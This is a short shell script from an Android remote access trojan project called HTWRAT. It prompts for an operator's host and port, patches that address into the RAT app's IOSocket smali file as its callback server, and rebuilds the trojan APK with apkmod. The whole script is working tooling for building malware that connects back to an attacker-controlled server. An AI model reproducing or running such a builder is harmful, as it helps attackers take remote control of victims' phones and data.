#!/usr/bin/env sh

smaliFile="smali/com/hax4us/HTWRAT/IOSocket.smali"

if [ -d $PREFIX/share/htwrat -a -d $HOME/htwrat ]; then
    echo "[!] You installed htwrat by both TermuxBlack and Github so please remove anyone first"
    exit 1
elif [ -d $PREFIX/share/HTWRAT ]; then
    appPath="$PREFIX/share/HTWRAT/server/app/factory/decompiled"
else
    appPath="$HOME/HTWRAT/server/app/factory/decompiled"
fi

read -p "[*] IP/URL/HOST : " host        
read -p "[*] PORT : " port

sed -i "s#http.*#http://$host:$port?model=\"#" $appPath/$smaliFile

apkmod -R "$appPath" -o ~/HTWRAT/HTWRAT.apk
